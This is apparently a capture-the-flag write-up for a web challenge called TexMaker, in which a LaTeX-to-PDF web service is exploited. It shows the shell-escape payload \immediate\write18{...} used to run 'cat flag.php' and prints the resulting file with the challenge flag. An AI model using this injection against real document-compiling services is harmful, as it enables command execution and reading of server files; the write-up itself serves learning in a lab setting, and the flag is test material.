# Web90 - TexMaker

## Description

Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any flaws.

## Solution

This task was about code injection in a latex compiler.

We can execute system commands with latex by using

```
\immediate\write18{command}
```

We can now get the flag with the following command

```
\immediate\write18{cat flag.php}
```

and the output is

```php
<?php
$FLAG = "IW{L4T3x_IS_Tur1ng_c0mpl3te}";
?>
```